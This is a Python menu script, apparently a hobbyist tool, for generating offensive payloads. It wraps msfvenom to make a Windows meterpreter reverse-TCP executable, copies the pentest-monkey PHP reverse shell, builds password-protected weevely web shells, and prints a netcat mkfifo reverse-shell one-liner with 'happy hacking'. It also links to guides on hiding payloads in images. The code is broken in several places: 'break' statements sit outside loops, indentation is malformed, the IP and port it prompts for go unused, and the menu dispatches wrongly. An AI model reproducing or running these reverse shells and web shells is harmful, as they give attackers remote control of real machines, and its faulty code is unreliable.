import os
import webbrowser
def banner():
        
        print ("""
        
        
               Targets are located , guns are reloaded
                    
 ______________|______________        
 |             |             |
 |             |             |
 |             |             |
 |             |             |
_|_________         _________|_
 |                           |
 |             |             |
 |             |             |
 |             |             |
 |_____________|_____________|        
               |                Created by ahmad shakla

=======>>   0.Exit
=======>>   1.Create an encrypted metasploit windows payload
=======>>   2.Create a php payload (pentest-monkey)
=======>>   3.Create a php payload with password
=======>>   4.Create a NetCat payload
=======>>   5.Create payloads injected with images
=======>>   6.Just open PayloadsAllTheThings 
        
        
        """)

       
def install():

        print("installing tools please wait...\n\n")
        os.system("apt-get update")
        os.system("clear")
        os.system("apt-get install exiftool")
        os.system("clear")
        os.system("apt-get install exe2hex")
        os.system("clear")
        os.system("apt-get install weevely")
        os.system("clear")
def metasploit_payload():
        
        os.system("echo Enter your ip : ;read ip; echo Enter your port : ;read port; msfvenom -p windows/meterpreter/reverse_tcp -o /root/payload.exe; clear; echo payload generated")
        break;
def php_payload():
        
        os.system("cp /usr/share/webshells/php/php-reverse-shell /root/php-payload.php; clear; echo pentest-monkey php payload is now in your /root directory")
        break;
def php_payload_with_password():
        os.system("echo Enter your password : ;read password; weevely generate ${password} /root/php-payload-passwd.php; clear; echo weevey payload is now in your /root directory")
        break;
        
def payload_with_picture():

        print ("Here are your insturctions ...")
        webbrowser.open('https://null-byte.wonderhowto.com/how-to/hacking-macos-hide-payloads-inside-photo-metadata-0196815/')
        break;
def netcat_payload():
        print ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP YOUR-PORT >/tmp/f")
        print ("Here is your payload ... happy hacking")
        break;
      
def payloads_all_the_things():

        print ("Opening PayloadsAllTheThings")
        webbrowser.open('https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md')
        break;
 def encrypted_metasploit_payload():
        os.system("echo Enter your payload : ; read msfvenom; exe2hex -x ${msfvenom} -b payload.bat -p payload.ps1 -cc -v; clear; echo payload generated in .bat and .ps1 extension")
        break;
install()
banner()

user = input ("Trigger)")
x = 4
while x != 5 :
        if user == "0" :
                print ("Thanks for using the tool ")
                break;
         elif user == "1" :
                encrypted_metasploit_payload()
                
         elif user == "2" :
                php_payload()
                
         elif user == "3" : 
                php_payload_with_password()
                
         elif user == "4" :
                netcat_payload()
                
         elif user == "5" : 
                payload_with_picture
                
         elif user == "6" :
                payloads_all_the_things()
                
         else :
                x = 5
                print ("Incorrect command\n")
                user = input ("Trigger)")
                x = 4
